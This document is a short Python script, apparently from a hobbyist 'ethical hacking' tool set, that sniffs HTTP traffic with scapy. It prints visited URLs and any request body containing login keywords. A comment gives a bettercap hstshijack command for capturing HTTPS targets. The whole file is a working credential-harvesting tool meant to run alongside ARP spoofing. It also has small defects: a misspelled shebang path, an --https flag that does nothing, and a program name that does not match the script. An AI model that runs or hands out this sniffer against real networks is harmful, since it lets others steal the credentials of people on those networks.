#!/usr/in/env pyhton

import argparse
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "uname", "pass", "password"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # gets accessed URLs
        url = get_url(packet)
        print("[+] HTTP Request > " + url.decode())  # decode converts a byte object to a string (similar to str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


def get_arguments():
    parser = argparse.ArgumentParser(
        prog='arp_spoof',
        description='Sniffs packets going through a specified interface, looking for potential login info',
        epilog='Part of EthicalHackingTools.'
    )
    parser.add_argument("-i", "--interface", dest="interface", help="Target interface to sniff", default="eth0",
                        required=False)
    parser.add_argument("-s", "--https", dest="https", action="store_true",
                        help="Toggle if used against http or https target. Will start bettercap hstshijack.")

    options = parser.parse_args()
    return options


arguments = get_arguments()

# for HTTPS:
# bettercap -iface eth0 -caplet hstshijack/hstshijack

sniff(arguments.interface)
